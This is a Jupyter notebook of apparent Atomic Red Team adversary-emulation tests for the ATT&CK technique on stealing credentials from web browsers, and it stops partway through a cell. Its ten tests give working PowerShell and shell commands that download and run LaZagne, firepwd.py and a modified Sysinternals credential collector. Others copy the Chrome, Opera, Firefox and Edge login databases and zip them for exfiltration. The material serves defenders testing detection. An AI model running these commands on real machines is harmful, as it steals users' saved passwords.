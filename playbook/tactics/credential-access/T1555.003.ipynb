{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d8bf2191",
   "metadata": {},
   "source": "# T1555.003 - Credentials from Web Browsers\nAdversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator)."
  },
  {
   "cell_type": "markdown",
   "id": "b2f057ba",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "2947e57d",
   "metadata": {},
   "source": "### Atomic Test #1 - Run Chrome-password Collector\nA modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Modified Sysinternals must be located at #{file_path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\SysInternals\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Modified-SysInternalsSuite.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Modified-SysInternalsSuite.zip\" -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5a4f2425",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "164de145",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-Location -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals\";\n./accesschk.exe -accepteula .;\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6335b1e1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "91ac9b5d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a561a55f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d6bfd306",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Search macOS Safari Cookies",
    "This test uses `grep` to search a macOS Safari binaryCookies file for specified values. This was used by CookieMiner malware.\n\nUpon successful execution, MacOS shell will cd to `~/Libraries/Cookies` and grep for `Cookies.binarycookies`.\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncd ~/Library/Cookies\ngrep -q \"coinbase\" \"Cookies.binarycookies\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1028aad9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "68298a12",
   "metadata": {},
   "source": "### Atomic Test #3 - LaZagne - Credentials from Browser\nThe following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63ffa6ec",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "726d539e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe\" browsers\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1549efee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "d8d255de",
   "metadata": {},
   "source": "### Atomic Test #4 - Simulating access to Chrome Login Data\nSimulates an adversary accessing encrypted credentials from Google Chrome Login database. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Chrome must be installed\n\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\")) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ChromeStandaloneSetup64.msi\" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi\nmsiexec /i $installer /qn\nStart-Process -FilePath \"chrome.exe\"\nStop-Process -Name \"chrome\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c06124be",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "50014bb7",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\nCopy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa1e13c2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "01de709a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "283fbdf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e7b6732e",
   "metadata": {},
   "source": "### Atomic Test #5 - Simulating access to Opera Login Data\nSimulates an adversary accessing encrypted credentials from Opera web browser's login database. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Opera must be installed\n\n##### Check Prereq Commands:\n```powershell\nif (((Test-Path \"$env:LOCALAPPDATA\\Programs\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files\\Opera\\launcher.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Opera\\launcher.exe\"))) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\"\nInvoke-WebRequest -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\OperaStandaloneInstaller.exe\" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe\nStart-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'\nStart-Sleep -s 180\nStop-Process -Name \"opera\"\n\n```\n##### Description: Opera login data file must exist\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -ItemType File\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1fe53363",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "29ef8277",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9402b2a4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "5b5054f8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a5e4459",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "138063c9",
   "metadata": {},
   "source": "### Atomic Test #6 - Simulating access to Windows Firefox Login Data\nSimulates an adversary accessing encrypted credentials from firefox web browser's login database.\nmore info in https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Firefox must be installed\n\n##### Check Prereq Commands:\n```powershell\nif ((Test-Path \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\") -Or (Test-Path \"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\")) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US\"}else {$url=\"https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US\"}\n$installer = \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefoxsetup.exe\"\n(New-Object Net.WebClient).DownloadFile($url,$installer)\nStart-Process $installer -ArgumentList '/S' -Wait\n\n```\n##### Description: Firefox login data file must exist\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nif ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"}else {$firefox=\"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe\"}\nStart-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait\nStart-Process $firefox -NoNewWindow\nStart-Sleep -s 20\nStop-Process -Name firefox\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f58ae2f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6f1695bf",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6a15a0ad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "475d236e",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bcdd368",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dad482e7",
   "metadata": {},
   "source": "### Atomic Test #7 - Simulating access to Windows Edge Login Data\nSimulates an adversary accessing encrypted credentials from Edge web browser's login database.\nmore info in https://www.forensicfocus.com/articles/chromium-based-microsoft-edge-from-a-forensic-point-of-view/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Edge must be installed\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\n\"Installation is not implemented as Edge is a part of windows\"\n\n```\n##### Description: Edge login data file must exist\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\") {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\n$edge=\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\"\nStart-Process $edge \nStart-Sleep -s 20\nStop-Process -Name msedge\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4cb2fb4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "da1761c7",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nCopy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -Recurse\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bfc86608",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "00b005c2",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Edge\" -Force -ErrorAction Ignore -Recurse\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1d9cfe9f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "85e49e4a",
   "metadata": {},
   "source": "### Atomic Test #8 - Decrypt Mozilla Passwords with Firepwd.py\nFirepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Firepwd must exist at #{Firepwd_Path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py\"\n\n```\n##### Description: Firefox profile directory must be present\n\n##### Check Prereq Commands:\n```powershell\nif (get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\" -erroraction silentlycontinue) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\"\nmsiexec.exe /i \"PathToAtomicsFolder\\..\\ExternalPayloads\\firefox.msi\" /quiet\nsleep -s 30\nstart-process \"$env:programfiles\\Mozilla Firefox\\firefox.exe\".\nsleep -s 5\nstop-process -name \"firefox\"\n\n```\n##### Description: Visual Studio Build Tools command prompt must exist at #{VS_CMD_Path}\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://aka.ms/vs/17/release/vs_BuildTools.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe\"\nwrite-host \"Visual Studio Build Tools (Desktop Development with C++) must be installed manually. Please run the installer from PathToAtomicsFolder\\..\\ExternalPayloads\\VS_BuildTools.exe.\"\n\n```\n##### Description: Python must be installed\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"C:\\Program Files\\Python310\\python.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n\n```\n##### Description: Pip must be installed.\n\n##### Check Prereq Commands:\n```powershell\n$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip -v) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://bootstrap.pypa.io/ez_setup.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"      \ninvoke-webrequest \"https://bootstrap.pypa.io/get-pip.py\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\ez_setup.py\"\ncmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\get-pip.py\"\n\n```\n##### Description: Pycryptodome library must be installed \n\n##### Check Prereq Commands:\n```powershell\n$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pycryptodome) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\"){pip install pycryptodome | out-null | cmd /c %comspec% /k \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq\"}\n\n```\n##### Description: Pyasn1 library must be installed \n\n##### Check Prereq Commands:\n```powershell\n$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (pip show pyasn1) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n$env:Path = [System.Environment]::ExpandEnvironmentVariables([System.Environment]::GetEnvironmentVariable(\"Path\",\"Machine\") + \";\" + [System.Environment]::GetEnvironmentVariable(\"Path\",\"User\"))\nif (test-path \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\"){pip install pyasn1 | out-null | cmd /c %comspec% /k \"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\" | out-null} else {write-host \"Visual Studio Build Tools (C++ Support) must be installed to continue gathering this prereq.\"}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb0fdbfa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2e0d11c8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$PasswordDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\ncmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt\ncat $env:temp\\T1555.003Test8.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c9b4da3b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "f0b2f45a",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \"$env:temp\\T1555.003Test8.txt\" -erroraction silentlycontinue   \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b33bc940",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "93acba36",
   "metadata": {},
   "source": "### Atomic Test #9 - LaZagne.py - Dump Credentials from Firefox Browser\nCredential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Get Lazagne from Github and install requirements\n##### Check Prereq Commands:\n```sh\ntest -f /tmp/LaZagne/Linux/laZagne.py\n```\n##### Get Prereq Commands:\n```sh\ncd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt\n```\n##### Description: Needs git, python3 and some pip stuff\n##### Check Prereq Commands:\n```sh\nwhich git && which python3 && which pip\n```\n##### Get Prereq Commands:\n```sh\napt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd2a6140",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "37b46ffc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\npython3 /tmp/LaZagne/Linux/laZagne.py browsers -firefox >> /tmp/firefox_password.txt```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d2b69b43",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "9bbb1528",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -R /tmp/LaZagne; rm -f /tmp/firefox_password.txt```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd6a5735",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "667df66e",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Stage Popular Credential Files for Exfiltration",
    "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$exfil_folder = \"$env:temp\\T1555.003\"\nif (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}\n$FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"\nif (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}\nif (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}\nif (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}\nif (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}\nif (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} \ncompress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "90971dc6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1555.003 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "be8deb63",
   "metadata": {},
